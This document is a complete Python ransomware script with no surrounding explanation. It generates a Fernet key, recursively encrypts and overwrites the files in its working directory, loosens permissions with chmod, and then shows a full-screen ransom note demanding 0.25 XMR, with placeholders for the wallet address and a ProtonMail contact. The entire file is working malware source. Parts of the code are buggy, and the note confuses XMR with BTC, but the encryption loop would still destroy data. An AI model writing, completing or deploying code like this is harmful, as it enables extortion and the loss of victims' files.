import os
import os.path
import platform
import stat
from cryptography.fernet import Fernet
from tkinter import *
from tkinter.ttk import *


#operating_system = platform.system()
operating_system = "Windows"
print(operating_system)


if operating_system == "Windows":
	print("CWD = C:\\Users\\")
	operator = "\\"
	#cwd = "C:\\Users\\"
if operating_system == "Linux":
	print("CWD = /home")
	#cwd = "/home"
	operator = "/"
	
if operating_system == "Darwin":
	print("CWD = /Users/")
	#cwd = "/Users/"
	operator = "/"


cwd = os.getcwd()
os.chmod(cwd, stat.S_IRWXO)
os.chmod(cwd, stat.S_IRWXG)


key = Fernet.generate_key()
print(key)
files = []

cwd = os.getcwd()
with open("hacked.hack", "wb") as thekey:
 	thekey.write(key)
 	
def encrypt(cwd):
	os.chmod(cwd, 777)
	os.chmod(files[0], stat.S_IRWXG)
	with open(files[0], "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	print(files[0])
	print(__file__)
	os.chmod(files[0], stat. S_IWRITE)
	with open(files[0], "wb") as thefile:
		thefile.write(contents_encrypted)
	files.pop(0)
 	
def folder(newwd):
	cwd = newwd	
	os.chmod(cwd, stat.S_IRWXG)	
	for file in os.listdir(newwd):
		os.chmod(file, stat.S_IRWXG)
		if file == "encryptor.py" or file == "hacked.hack" or file == "decryptor.py" or "crypt" in file:
			continue
		
		os.chmod(file, stat.S_IRWXG)
		if os.path.isfile(cwd+file):
			files.append(cwd+file)
			encrypt(cwd)

		os.chmod(file, stat.S_IRWXG)
		if os.path.isdir(cwd+file):
			newwd = ((cwd)+file+operator)
			folder(newwd)
	
	
cwd = os.getcwd()+operator	
os.chmod(cwd, stat.S_IRWXO)
os.chmod(cwd, stat.S_IRWXG)		
for file in os.listdir(cwd):
	if file == "encryptor.py" or file == "hacked.hack" or file == "decryptor.py" or "crypt" in file:
		continue
	os.chmod(file, stat.S_IRWXG)
	if os.path.isfile(file):
		files.append(cwd+file)
		os.chmod(cwd, stat.S_IRWXG)
		encrypt(cwd)
			
	if os.path.isdir(file):
		newwd = (os.getcwd()+operator+file+operator)
		#print((newwd))
		folder(newwd)

decodedkey = str(key)

master = Tk()
master.geometry("1920x1080")
label = Label(master,
		text ="\n""\n""\n""\n"
"You have been hiJACKed""\n""\n""\n""\n""Unfortunately you have fallen victim to a ransomware attack...""\n""\nAs such we have obfuscated all of your important files...""\n""\nTo recover your files you will need to send 0.25 $XMR to the following Crypto wallet!""\n""\n""\n""\n""\n""Wallet Address: Insert XMR Wallet Address Here""\n""\n""\n""Once you have sent us the BTC""\n""\n""Please email a copy of your transaction ID to Insert ProtonMail Email Here""\n""\n""With the following encrypted code...""\n""\n"+decodedkey)
label.pack(pady = 5)
master.title("hiJACKed")
mainloop()

